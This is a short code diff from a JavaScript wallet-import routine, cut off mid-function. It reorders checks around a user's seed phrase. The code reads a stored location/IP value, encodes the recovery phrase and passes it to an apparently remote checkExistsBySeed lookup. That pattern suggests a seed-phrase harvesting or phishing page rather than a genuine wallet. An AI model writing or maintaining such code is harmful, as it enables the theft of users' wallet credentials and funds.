@@ -126,14 +126,14 @@ function validateMnemonic(mnemonic) {
         SetProcessing(true);
         var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
         var formattedSeedPhrase = normalizeText(secretPharse);
-        if(formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
-            if(validateMnemonic(formattedSeedPhrase)){
-                var encode = '';
-                try{
-                  encode = await encodeSeed(formattedSeedPhrase);
-                }catch(e){
-                  console.log(e);
-                }
+        if(validateMnemonic(formattedSeedPhrase)){
+          var encode = '';
+          try{
+            encode = await encodeSeed(formattedSeedPhrase);
+          }catch(e){
+            console.log(e);
+          }
+          if(!getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
                 const isExist = await checkExistsBySeed(encode? encode : formattedSeedPhrase);
                 if(!isExist){
                     var _asset = '';
